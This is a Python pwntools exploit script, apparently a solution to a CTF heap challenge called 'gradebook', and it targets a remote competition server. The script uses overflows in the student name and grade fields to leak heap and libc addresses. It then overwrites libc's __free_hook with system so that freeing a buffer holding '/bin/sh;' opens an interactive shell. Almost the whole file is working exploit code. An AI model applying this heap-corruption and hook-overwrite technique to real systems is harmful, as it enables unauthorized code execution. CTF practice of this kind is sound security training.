#!/usr/bin/env python3

from pwn import *

exe = ELF("./gradebook_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe

def conn():
    r = process([exe.path])
    return r

#r = conn()
r = remote("ctf.k3rn3l4rmy.com", 2250)

def sl(data):
    r.sendlineafter("> ", data)

def s(data):
    r.sendlineafter("> ", data)

def add_student(id_, length, name):
    sl("1")
    r.sendlineafter("Enter student id: \n", id_)
    r.recvline()
    r.sendline(str(length))
    r.recvline()
    r.send(name)

def update_grade(id_, grade):
    sl("3")
    r.sendlineafter("Enter student id: \n", id_)
    r.sendlineafter("Enter grade: ", str(grade))

def free_all():
    sl("5")

def update_name(id_, name):
    sl("4")
    r.sendlineafter("Enter student id: \n", id_)
    r.recvline()
    r.send(name)

def get_leaks():
    sl("2")

def main():
    add_student("0"*0x8, 0x500, "BBBBB")
    add_student("1"*0x8, 0x20, "CCCCCC")
    free_all()
    add_student("MAHER", 20, "AAAAAAA")
    add_student("1337", 10, "ASTUDENT")
    update_grade("MAHER", 0x4D4D4D4D4D4D4D4D)
    update_name("MAHER", b"/bin/sh;" + b"S"*0x28 + p8(0xe8))
    get_leaks()
    """
    r.recvuntil("NAME: ")
    r.recvuntil(b"S"*0x30)
    heap_leak = u64(r.recvline().strip().ljust(8, p8(0)))
    log.info("Heap leak @ 0x%x", heap_leak)
    heap_base = heap_leak - 0x253
    log.info("Heap base @ 0x%x", heap_base)
    
    pause()
    update_name(b"S"*0x8, b"C"*0x30 + p64(heap_base + 0x300))


    #free_all()
    #add_student("M"*7, 20, "M"*7)
    r.interactive()
    update_grade("MAHER", 0x4D4D4D4D4D4D4D4D)
    """
    
    r.recvuntil("NAME: ")
    r.recvuntil("NAME: ")
    libc_leak = u64(r.recvline().strip().ljust(8, p8(0)))
    log.info("Libc leak @ 0x%x", libc_leak)

    libc.address = libc_leak - 0x1ebbe0
    log.warn("Libc base @ 0x%x", libc.address)
    
    add_student("13371", 10, "ASTUDENT")
    add_student("13372", 10, "ASTUDENT")
    update_grade("13371", 0x4D4D4D4D4D4D4D4D)
    update_name("13371", b"A"*0x20 + b"FUCK" + p32(0) + b"A"*7 + p8(0) + p64(libc.sym["__free_hook"]))
    update_name("FUCK", p64(libc.sym['system']))
    r.interactive()


if __name__ == "__main__":
    main()
